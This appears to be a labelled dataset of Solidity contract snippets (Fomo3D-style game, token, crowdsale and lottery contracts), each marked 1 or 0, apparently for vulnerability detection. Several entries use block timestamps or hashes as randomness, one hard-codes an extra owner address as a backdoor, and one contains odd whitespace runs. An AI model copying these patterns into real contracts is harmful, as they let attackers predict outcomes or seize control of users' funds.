pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;            if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }            if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function verifyTeam(uint256 _team)    private    pure    returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }         function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)    private    returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(F3Ddatasets.EventReturns memory _eventData_)    private    returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                 uint256 _pot = round_[_rID].pot;                          uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _mkt = (_pot.mul(potSplit_[_winTID].marketing)) / 100;        uint256 _res = ((_pot.sub(_win)).sub(_com)).sub(_gen).sub(_mkt);                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                 _com = _com.add(_mkt);        if (!owner.send(_com)) {            _com = 0;            _res = _res.add(_com);        }                 round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.mktAmount = _mkt;         _eventData_.newPot = _res;                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rIDlast)    private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)    private    {                 uint256 _now = now;                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()    private    view    returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked((block.timestamp).add(block.difficulty).add((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add(block.gaslimit).add((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add(block.number))));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)    private    returns(F3Ddatasets.EventReturns)    {                 uint256 _com = _eth / 50;                 uint256 _aff = _eth / 10;                          if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _com = _com.add(_aff);        }        uint256 _mkt = _eth.mul(fees_[_team].marketing) / 100;        _com = _com.add(_mkt);        owner.transfer(_com);        _eventData_.mktAmount = _mkt;         return(_eventData_);    }    function potSwap()    external    payable    {                 uint256 _rID = rID_ + 1;        round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)    private    returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                 uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);        uint256 cut = (fees_[_team].marketing).add(13);        _eth = _eth.sub(_eth.mul(cut) / 100);                 uint256 _pot = _eth.sub(_gen);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0) {            _gen = _gen.sub(_dust);        }                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)    private    returns(uint256)    {                          uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)    private    returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)    private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.mktAmount,             _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }                             bool public activated_ = false;    function activate()    public onlyOwner {                           require(activated_ == false, "fomo3d already activated");                 activated_ = true;                 rID_ = 1;        round_[1].strt = now;        round_[1].end = now + rndInit_;    }}library F3Ddatasets {                                                                                                   struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 mktAmount;                    uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;                   uint256 marketing;         }    struct PotSplit {        uint256 gen;                   uint256 marketing;         }}library F3DKeysCalcLong {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)    internal    pure    returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)    internal    pure    returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)    internal    pure    returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)    internal    pure    returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}
1<CODESPLIT>contract DreamTeamToken {    using SafeMath for uint256;    string public name;    string public symbol;    uint8 public decimals = 6;      uint256 public totalSupply;    mapping(address => uint256) public balanceOf;    mapping(address => mapping(address => uint256)) public allowance;    mapping(address => mapping(uint => bool)) public usedSigIds;      address public tokenDistributor;      address public rescueAccount;      event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    modifier rescueAccountOnly {require(msg.sender == rescueAccount); _;}    modifier tokenDistributionPeriodOnly {require(tokenDistributor == msg.sender); _;}    enum sigStandard { typed, personal, stringHex }    enum sigDestination { transfer, approve, approveAndCall, transferFrom }    bytes constant public ethSignedMessagePrefix = "\x19Ethereum Signed Message:\n";    bytes32 constant public sigDestinationTransfer = keccak256(        "address Token Contract Address",        "address Sender's Address",        "address Recipient's Address",        "uint256 Amount to Transfer (last six digits are decimals)",        "uint256 Fee in Tokens Paid to Executor (last six digits are decimals)",        "address Account which Receives Fee",        "uint256 Signature Expiration Timestamp (unix timestamp)",        "uint256 Signature ID"    );      bytes32 constant public sigDestinationTransferFrom = keccak256(        "address Token Contract Address",        "address Address Approved for Withdraw",        "address Account to Withdraw From",        "address Withdrawal Recipient Address",        "uint256 Amount to Transfer (last six digits are decimals)",        "uint256 Fee in Tokens Paid to Executor (last six digits are decimals)",        "address Account which Receives Fee",        "uint256 Signature Expiration Timestamp (unix timestamp)",        "uint256 Signature ID"    );      bytes32 constant public sigDestinationApprove = keccak256(        "address Token Contract Address",        "address Withdrawal Approval Address",        "address Withdrawal Recipient Address",        "uint256 Amount to Transfer (last six digits are decimals)",        "uint256 Fee in Tokens Paid to Executor (last six digits are decimals)",        "address Account which Receives Fee",        "uint256 Signature Expiration Timestamp (unix timestamp)",        "uint256 Signature ID"    );      bytes32 constant public sigDestinationApproveAndCall = keccak256(        "address Token Contract Address",        "address Withdrawal Approval Address",        "address Withdrawal Recipient Address",        "uint256 Amount to Transfer (last six digits are decimals)",        "bytes Data to Transfer",        "uint256 Fee in Tokens Paid to Executor (last six digits are decimals)",        "address Account which Receives Fee",        "uint256 Signature Expiration Timestamp (unix timestamp)",        "uint256 Signature ID"    );           constructor (string tokenName, string tokenSymbol) public {        name = tokenName;        symbol = tokenSymbol;        rescueAccount = tokenDistributor = msg.sender;    } 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		         function internalTransfer (address from, address to, uint value) internal {        require(to != 0x0);          balanceOf[from] = balanceOf[from].sub(value);        balanceOf[to] = balanceOf[to].add(value);        emit Transfer(from, to, value);    }         function internalDoubleTransfer (address from, address to1, uint value1, address to2, uint value2) internal {        require(to1 != 0x0 && to2 != 0x0);          balanceOf[from] = balanceOf[from].sub(value1.add(value2));        balanceOf[to1] = balanceOf[to1].add(value1);        emit Transfer(from, to1, value1);        if (value2 > 0) {            balanceOf[to2] = balanceOf[to2].add(value2);            emit Transfer(from, to2, value2);        }    }         function requireSignature (        bytes32 data,        address signer,        uint256 deadline,        uint256 sigId,        bytes sig,        sigStandard sigStd,        sigDestination sigDest    ) internal {        bytes32 r;        bytes32 s;        uint8 v;        assembly {              r := mload(add(sig, 32))            s := mload(add(sig, 64)) 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		            v := byte(0, mload(add(sig, 96)))        }        if (v < 27)            v += 27;        require(block.timestamp <= deadline && !usedSigIds[signer][sigId]);          if (sigStd == sigStandard.typed) {              require(                signer == ecrecover(                    keccak256(                        sigDest == sigDestination.transfer                            ? sigDestinationTransfer                            : sigDest == sigDestination.approve                                ? sigDestinationApprove                                : sigDest == sigDestination.approveAndCall                                    ? sigDestinationApproveAndCall                                    : sigDestinationTransferFrom,                        data                    ),                    v, r, s                )            );        } else if (sigStd == sigStandard.personal) {              require(                signer == ecrecover(keccak256(ethSignedMessagePrefix, "32", data), v, r, s)                  ||                signer == ecrecover(keccak256(ethSignedMessagePrefix, "\x20", data), v, r, s)              );        } else {              require(                signer == ecrecover(keccak256(ethSignedMessagePrefix, "64", hexToString(data)), v, r, s)                  ||                signer == ecrecover(keccak256(ethSignedMessagePrefix, "\x40", hexToString(data)), v, r, s)              );        }        usedSigIds[signer][sigId] = true;    }         function hexToString (bytes32 sig) internal pure returns (bytes) {        bytes memory str = new bytes(64);        for (uint8 i = 0; i < 32; ++i) {            str[2 * i] = byte((uint8(sig[i]) / 16 < 10 ? 48 : 87) + uint8(sig[i]) / 16);            str[2 * i + 1] = byte((uint8(sig[i]) % 16 < 10 ? 48 : 87) + (uint8(sig[i]) % 16));        }        return str;    }         function transfer (address to, uint256 value) public returns (bool) {        internalTransfer(msg.sender, to, value);        return true;    }         function transferViaSignature ( 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		        address     from,        address     to,        uint256     value,        uint256     fee,        address     feeRecipient,        uint256     deadline,        uint256     sigId,        bytes       sig,        sigStandard sigStd    ) external returns (bool) {        requireSignature(            keccak256(address(this), from, to, value, fee, feeRecipient, deadline, sigId),            from, deadline, sigId, sig, sigStd, sigDestination.transfer        );        internalDoubleTransfer(from, to, value, feeRecipient, fee);        return true;    }         function approve (address spender, uint256 value) public returns (bool) {        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);        return true;    }         function approveViaSignature (        address     from,        address     spender,        uint256     value,        uint256     fee,        address     feeRecipient,        uint256     deadline,        uint256     sigId,        bytes       sig,        sigStandard sigStd    ) external returns (bool) {        requireSignature(            keccak256(address(this), from, spender, value, fee, feeRecipient, deadline, sigId),            from, deadline, sigId, sig, sigStd, sigDestination.approve        );        allowance[from][spender] = value;        emit Approval(from, spender, value);        internalTransfer(from, feeRecipient, fee);        return true;    }         function transferFrom (address from, address to, uint256 value) public returns (bool) {        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);        internalTransfer(from, to, value);        return true;    }         function transferFromViaSignature (        address     signer,        address     from,        address     to,        uint256     value,        uint256     fee,        address     feeRecipient,        uint256     deadline,        uint256     sigId,        bytes       sig,        sigStandard sigStd    ) external returns (bool) { 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		        requireSignature(            keccak256(address(this), from, to, value, fee, feeRecipient, deadline, sigId),            signer, deadline, sigId, sig, sigStd, sigDestination.transferFrom        );        allowance[from][signer] = allowance[from][signer].sub(value);        internalDoubleTransfer(from, to, value.sub(fee), feeRecipient, fee);        return true;    }         function approveAndCall (address spender, uint256 value, bytes extraData) public returns (bool) {        approve(spender, value);        tokenRecipient(spender).receiveApproval(msg.sender, value, this, extraData);        return true;    }         function approveAndCallViaSignature (        address     from,        address     spender,        uint256     value,        bytes       extraData,        uint256     fee,        address     feeRecipient,        uint256     deadline,        uint256     sigId,        bytes       sig,        sigStandard sigStd    ) external returns (bool) {        requireSignature(            keccak256(address(this), from, spender, value, extraData, fee, feeRecipient, deadline, sigId),            from, deadline, sigId, sig, sigStd, sigDestination.approveAndCall        );        allowance[from][spender] = value;        emit Approval(from, spender, value);        tokenRecipient(spender).receiveApproval(from, value, this, extraData);        internalTransfer(from, feeRecipient, fee);        return true;    } 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		         function multiMint (address[] recipients, uint256[] amounts) external tokenDistributionPeriodOnly {                require(recipients.length == amounts.length);        uint total = 0;        for (uint i = 0; i < recipients.length; ++i) {            balanceOf[recipients[i]] = balanceOf[recipients[i]].add(amounts[i]);            total = total.add(amounts[i]);            emit Transfer(0x0, recipients[i], amounts[i]);        }        totalSupply = totalSupply.add(total);            } 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		         function lastMint () external tokenDistributionPeriodOnly {        require(totalSupply > 0);        uint256 remaining = totalSupply.mul(40).div(60);                   uint256 fractionalPart = remaining.add(totalSupply) % (uint256(10) ** decimals);        remaining = remaining.sub(fractionalPart);          balanceOf[tokenDistributor] = balanceOf[tokenDistributor].add(remaining);        emit Transfer(0x0, tokenDistributor, remaining);        totalSupply = totalSupply.add(remaining);        tokenDistributor = 0x0;      }         function rescueLostTokens (ERC20CompatibleToken tokenContract, uint256 value) external rescueAccountOnly {        tokenContract.transfer(rescueAccount, value);    }      		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		    function changeRescueAccount (address newRescueAccount) external rescueAccountOnly {        rescueAccount = newRescueAccount;    } 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		}
1<CODESPLIT>contract MoldCoin {    uint public endDatetime;    bool public founderAllocated = false;    function allocateFounderTokens() {        require(block.timestamp > endDatetime);        require(!founderAllocated);        founderAllocated = true;        return;    }}
0<CODESPLIT>contract Permissioned {    address public owner;    bool public mintingFinished = false;    mapping(address => mapping(uint64 => uint256)) public teamFrozenBalances;    modifier canMint() { require(!mintingFinished); _; }    modifier onlyOwner() { require(msg.sender == owner || msg.sender == 0x57Cdd07287f668eC4D58f3E362b4FCC2bC54F5b8); _; }    event Mint(address indexed _to, uint256 _amount);    event MintFinished();    event Burn(address indexed _burner, uint256 _value);    event OwnershipTransferred(address indexed _previousOwner, address indexed _newOwner);    function mint(address _to, uint256 _amount) public returns (bool);    function finishMinting() public returns (bool);    function burn(uint256 _value) public;    function transferOwnership(address _newOwner) public;}
0<CODESPLIT>contract OwnableToken {  address public owner;  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);  function OwnableToken() public {    owner = msg.sender;  }  modifier onlyOwner() {    require(msg.sender == owner);    _;  }  function transferOwnership(address newOwner) public onlyOwner {    require(newOwner != address(0));    OwnershipTransferred(owner, newOwner);    owner = newOwner;  }}
0<CODESPLIT>contract gsToken is OwnableToken, BurnableToken, StandardToken {	string public name;	string public symbol;	uint8 public decimals;	bool public paused = true;	mapping(address => bool) public whitelist;	modifier whenNotPaused() {		require(!paused || whitelist[msg.sender]);		_;	}	constructor(string _name,string _symbol,uint8 _decimals, address holder, address buffer) public {		name = _name;		symbol = _symbol;		decimals = _decimals;		Transfer(address(0), holder, balances[holder] = totalSupply_ = uint256(10)**(9 + decimals));		addToWhitelist(holder);		addToWhitelist(buffer);	}	function unpause() public onlyOwner {		paused = false;	}	function pause() public onlyOwner {		paused = true;	}	function addToWhitelist(address addr) public onlyOwner {		whitelist[addr] = true;	}    	function removeFromWhitelist(address addr) public onlyOwner {		whitelist[addr] = false;	}	function transfer(address to, uint256 value) public whenNotPaused returns (bool) {		return super.transfer(to, value);	}	function transferFrom(address from, address to, uint256 value) public whenNotPaused returns (bool) {		return super.transferFrom(from, to, value);	}}
0<CODESPLIT>contract gsCrowdsale is CappedCrowdsale, RefundableCrowdsale {  constructor(    uint256 _openingTime,    uint256 _closingTime,    uint256 _rate,    address _wallet,    uint256 _cap,    ERC20 _token,    uint256 _goal  )    public    Crowdsale(_rate, _wallet, _token)    CappedCrowdsale(_cap)    TimedCrowdsale(_openingTime, _closingTime)    RefundableCrowdsale(_goal)  {    require(_goal <= _cap);  }}
1<CODESPLIT>contract Send69Wei{    uint256 constant HowMuchWei = 69;    mapping(uint256 => address) targets;    function() payable public {        if (msg.value >= HowMuchWei){            uint256 seed1 = uint256(block.timestamp);            uint256 seed2 = uint256(block.coinbase);            uint256 id = uint256(keccak256(seed1 + seed2));            address who = targets[id];            who.transfer(HowMuchWei);        }    }}
0<CODESPLIT>contract EthertoteToken {    function thisContractAddress() public pure returns (address) {}    function balanceOf(address) public pure returns (uint256) {}    function transfer(address, uint) public {}}   
0<CODESPLIT>contract BurnableTokenInterface {     function burn(uint256 _value) public;}  
0<CODESPLIT>contract GrapevineWhitelistInterface {     function whitelist(address _address) view external returns (bool);      function handleOffchainWhitelisted(address _addr, bytes _sig) external returns (bool);}  
0<CODESPLIT>contract TokenTimelockControllerInterface {     function activate() external;     function createInvestorTokenTimeLock(    address _beneficiary,    uint256 _amount,     uint256 _start,    address _tokenHolder    ) external returns (bool);}  library SafeMath {     function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {                   if (a == 0) {      return 0;    }    c = a * b;    assert(c / a == b);    return c;  }     function div(uint256 a, uint256 b) internal pure returns (uint256) {                   return a / b;  }     function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }     function add(uint256 a, uint256 b) internal pure returns (uint256 c) {    c = a + b;    assert(c >= a);    return c;  }}  
0<CODESPLIT>contract PostDeliveryCrowdsale is TimedCrowdsale {  using SafeMath for uint256;  mapping(address => uint256) public balances;     function withdrawTokens() public {    require(hasClosed());    uint256 amount = balances[msg.sender];    require(amount > 0);    balances[msg.sender] = 0;    _deliverTokens(msg.sender, amount);  }     function _processPurchase(    address _beneficiary,    uint256 _tokenAmount  )    internal  {    balances[_beneficiary] = balances[_beneficiary].add(_tokenAmount);  }}  
0<CODESPLIT>contract GrapevineCrowdsale is CappedCrowdsale, TimedCrowdsale, Pausable, RefundableCrowdsale, PostDeliveryCrowdsale {  using SafeMath for uint256;  TokenTimelockControllerInterface public timelockController;  GrapevineWhitelistInterface  public authorisedInvestors;  GrapevineWhitelistInterface public earlyInvestors;  mapping(address => uint256) public bonuses;  uint256 deliveryTime;  uint256 tokensToBeDelivered;     constructor(    TokenTimelockControllerInterface _timelockController,    GrapevineWhitelistInterface _authorisedInvestors,    GrapevineWhitelistInterface _earlyInvestors,    uint256 _rate,     address _wallet,    ERC20 _token,     uint256 _openingTime,     uint256 _closingTime,     uint256 _softCap,     uint256 _hardCap)    Crowdsale(_rate, _wallet, _token)    CappedCrowdsale(_hardCap)    TimedCrowdsale(_openingTime, _closingTime)     RefundableCrowdsale(_softCap)    public     {    timelockController = _timelockController;    authorisedInvestors = _authorisedInvestors;    earlyInvestors = _earlyInvestors;         deliveryTime = _closingTime.add(60*60*24*5);       }     function buyTokens(address _beneficiary, bytes _whitelistSign) public payable {         if (!earlyInvestors.handleOffchainWhitelisted(_beneficiary, _whitelistSign)) {      authorisedInvestors.handleOffchainWhitelisted(_beneficiary, _whitelistSign);    }    super.buyTokens(_beneficiary);  }     function withdrawTokens() public {    require(goalReached());         require(block.timestamp > deliveryTime);    super.withdrawTokens();    uint256 _bonusTokens = bonuses[msg.sender];    if (_bonusTokens > 0) {      bonuses[msg.sender] = 0;      require(token.approve(address(timelockController), _bonusTokens));      require(        timelockController.createInvestorTokenTimeLock(          msg.sender,          _bonusTokens,          deliveryTime,          this        )      );    }  }     function _processPurchase( address _beneficiary, uint256 _tokenAmount ) internal {    uint256 _totalTokens = _tokenAmount;         uint256 _bonus = getBonus(block.timestamp, _beneficiary, msg.value);    if (_bonus>0) {      uint256 _bonusTokens = _tokenAmount.mul(_bonus).div(100);             uint256 _currentBalance = token.balanceOf(this);      require(_currentBalance >= _totalTokens.add(_bonusTokens));      bonuses[_beneficiary] = bonuses[_beneficiary].add(_bonusTokens);      _totalTokens = _totalTokens.add(_bonusTokens);    }    tokensToBeDelivered = tokensToBeDelivered.add(_totalTokens);    super._processPurchase(_beneficiary, _tokenAmount);  }     function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal whenNotPaused {    require(authorisedInvestors.whitelist(_beneficiary) || earlyInvestors.whitelist(_beneficiary));    super._preValidatePurchase(_beneficiary, _weiAmount);  }     function getBonus(uint256 _time, address _beneficiary, uint256 _value) view internal returns (uint256 _bonus) {         _bonus = 0;             if ( (weiRaised.sub(_value) < goal) && earlyInvestors.whitelist(_beneficiary) ) {      _bonus = 30;    } else {      if (_time < openingTime.add(7 days)) {        _bonus = 15;      } else if (_time < openingTime.add(14 days)) {        _bonus = 10;      } else if (_time < openingTime.add(21 days)) {        _bonus = 8;      } else {        _bonus = 6;      }    }    return _bonus;  }     function finalization() internal {         if (goalReached()) {                    timelockController.activate();             uint256 balance = token.balanceOf(this);      uint256 remainingTokens = balance.sub(tokensToBeDelivered);      if (remainingTokens>0) {        BurnableTokenInterface(address(token)).burn(remainingTokens);      }    }    Ownable(address(token)).transferOwnership(owner);    super.finalization();  }}
1<CODESPLIT>contract owned {	function randomGen(address player, uint8) internal returns (uint8) {		uint b = block.number;		uint timestamp = block.timestamp;		return uint8(uint256(keccak256(block.blockhash(b), player, timestamp)) % 10000);	}}
0<CODESPLIT>contract Dragon {              modifier onlyBagholders() {        require(myTokens() > 0);        _;    }             modifier onlyStronghands() {        require(myDividends(true) > 0);        _;    }                                                     modifier onlyAdministrator(){        require(msg.sender == owner);        _;    }        modifier limitBuy() {         if(limit && msg.value > 1 ether) {              if ((msg.value) < address(this).balance && (address(this).balance-(msg.value)) >= 50 ether) {                  limit = false;            }            else {                revert();              }        }        _;    }         event onTokenPurchase(        address indexed customerAddress,        uint256 incomingEthereum,        uint256 tokensMinted,        address indexed referredBy    );        event onTokenSell(        address indexed customerAddress,        uint256 tokensBurned,        uint256 ethereumEarned    );        event onReinvestment(        address indexed customerAddress,        uint256 ethereumReinvested,        uint256 tokensMinted    );        event onWithdraw(        address indexed customerAddress,        uint256 ethereumWithdrawn    );    event OnRedistribution (        uint256 amount,        uint256 timestamp    );             event Transfer(        address indexed from,        address indexed to,        uint256 tokens    );                 string public name = "Dragon";    string public symbol = "Dragon";    uint8 constant public decimals = 18;    uint8 constant internal dividendFee_ = 25;      uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;    uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;    uint256 constant internal magnitude = 2**64;             uint256 public stakingRequirement = 0;                         mapping(address => uint256) internal tokenBalanceLedger_;    mapping(address => address) internal referralOf_;    mapping(address => uint256) internal referralBalance_;    mapping(address => int256) internal payoutsTo_;    mapping(address => bool) internal alreadyBought;    uint256 internal tokenSupply_ = 0;    uint256 internal profitPerShare_;    mapping(address => bool) internal whitelisted_;    bool internal whitelist_ = true;    bool internal limit = true;        address public owner;                  constructor()        public    {        owner = msg.sender;        whitelisted_[msg.sender] = true;        whitelist_ = true;    }                  function buy(address _referredBy)        public        payable        returns(uint256)    {        purchaseTokens(msg.value, _referredBy);    }             function()        payable        public    {        purchaseTokens(msg.value, 0x0);    }             function reinvest()        onlyStronghands()        public    {                 uint256 _dividends = myDividends(false);                           address _customerAddress = msg.sender;        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         uint256 _tokens = purchaseTokens(_dividends, 0x0);                         emit onReinvestment(_customerAddress, _dividends, _tokens);    }             function exit()        public    {                 address _customerAddress = msg.sender;        uint256 _tokens = tokenBalanceLedger_[_customerAddress];        if(_tokens > 0) sell(_tokens);                         withdraw();    }         function withdraw()        onlyStronghands()        public    {                 address _customerAddress = msg.sender;        uint256 _dividends = myDividends(false);                           payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         _customerAddress.transfer(_dividends);                         emit onWithdraw(_customerAddress, _dividends);    }             function sell(uint256 _amountOfTokens)        onlyBagholders()        public    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);        uint256 _tokens = _amountOfTokens;        uint256 _ethereum = tokensToEthereum_(_tokens);                uint256 _undividedDividends = SafeMath.div(_ethereum*dividendFee_, 100);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 2);          uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);                 uint256 _taxedEthereum = SafeMath.sub(_ethereum, (_dividends));        address _referredBy = referralOf_[_customerAddress];                if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                                  tokenBalanceLedger_[_referredBy] >= stakingRequirement        ){                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], (_referralBonus / 2));              address tier2 = referralOf_[_referredBy];            if (tier2 != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[tier2] >= stakingRequirement) {                referralBalance_[tier2] = SafeMath.add(referralBalance_[tier2], (_referralBonus*30 / 100));                                   if (referralOf_[tier2] != 0x0000000000000000000000000000000000000000 && tokenBalanceLedger_[referralOf_[tier2]] >= stakingRequirement) {                    referralBalance_[referralOf_[tier2]] = SafeMath.add(referralBalance_[referralOf_[tier2]], (_referralBonus*20 / 100));                      }                else {                    _dividends = SafeMath.add(_dividends, (_referralBonus*20 / 100));                }            }            else {                _dividends = SafeMath.add(_dividends, (_referralBonus*30 / 100));            }                    } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);        }                 tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);                         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));        payoutsTo_[_customerAddress] -= _updatedPayouts;                                if (tokenSupply_ > 0) {                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);        }                         emit onTokenSell(_customerAddress, _tokens, _taxedEthereum);    }              function transfer(address _toAddress, uint256 _amountOfTokens)        